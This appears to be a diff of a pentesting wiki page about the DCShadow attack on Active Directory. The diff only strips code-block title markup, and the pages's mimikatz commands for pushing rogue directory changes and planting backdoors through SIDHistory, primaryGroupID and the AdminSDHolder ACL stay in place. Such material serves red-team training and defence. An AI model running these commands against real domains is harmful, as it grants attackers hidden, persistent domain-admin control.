@@ -24,19 +24,19 @@ Note that if you use wrong data, pretty ugly logs will appear.
 
 To perform the attack you need 2 mimikatz instances. One of them will start the RPC servers with SYSTEM privileges (you have to indicate here the changes you want to perform), and the other instance will be used to push the values:
 
-{% code title="mimikatz1 (RPC servers)" %}
+
 ```bash
 !+
 !processtoken
 lsadump::dcshadow /object:username /attribute:Description /value="My new description"
 ```
-{% endcode %}
 
-{% code title="mimikatz2 (push) - Needs DA or similar" %}
+
+
 ```bash
 lsadump::dcshadow /push
 ```
-{% endcode %}
+
 
 Notice that **`elevate::token`** won't work in mimikatz1 session as that elevated the privileges of the thread, but we need to elevate the **privilege of the process**.\
 You can also select and "LDAP" object: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`
@@ -59,26 +59,26 @@ For example: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root
 
 ## Using DCShadow to create backdoors
 
-{% code title="Set Enterprise Admins in SIDHistory to a user" %}
+
 ```bash
 lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519 
 ```
-{% endcode %}
 
-{% code title="Chage PrimaryGroupID (put user as member of Domain Administrators)" %}
+
+
 ```bash
 lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
 ```
-{% endcode %}
 
-{% code title="Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)" %}
+
+
 ```bash
 #First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
 (New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
 #Second, add to the ACE permissions to your user and push it using DCShadow
 lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
 ```
-{% endcode %}
+
 
 ## Shadowception - Give DCShadow permissions using DCShadow (no modified permissions logs)
 
